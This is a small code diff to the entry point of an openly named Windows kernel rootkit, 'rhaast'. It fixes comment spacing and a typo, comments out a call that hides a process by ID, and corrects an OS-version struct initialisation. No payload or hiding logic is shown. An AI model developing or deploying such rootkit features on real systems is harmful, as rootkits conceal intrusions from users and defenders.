@@ -2,10 +2,10 @@
 
 /**
  * @brief
- *		main entry point of the rhaast rootkit
+ *      main entry point of the rhaast rootkit
  *  
  * @return	
- *		if successful executed function
+ *      if successful executed function
  */
 NTSTATUS RhaastEntry(
     VOID
@@ -32,14 +32,14 @@ NTSTATUS RhaastEntry(
     }
 
     /* Process hide */
-    ProcessHide( 9952 );
-
+    // ProcessHide( 9952 );
+    
     return NtStatus; 
 }
 
 /**
  * @brief
- *      initiliaze rhaast rootkit features
+ *      initialize rhaast rootkit features
  *
  * @return
  *      if successful executed function
@@ -47,7 +47,7 @@ NTSTATUS RhaastEntry(
 NTSTATUS RhaastInit(
     VOID
 ) {
-    RTL_OSVERSIONINFOW OsVersion = { 0 };
+    RTL_OSVERSIONINFOW OsVersion = { sizeof( RTL_OSVERSIONINFOW ) };
 
     /* get windows version */
     if ( RtlGetVersion( &OsVersion ) ) {
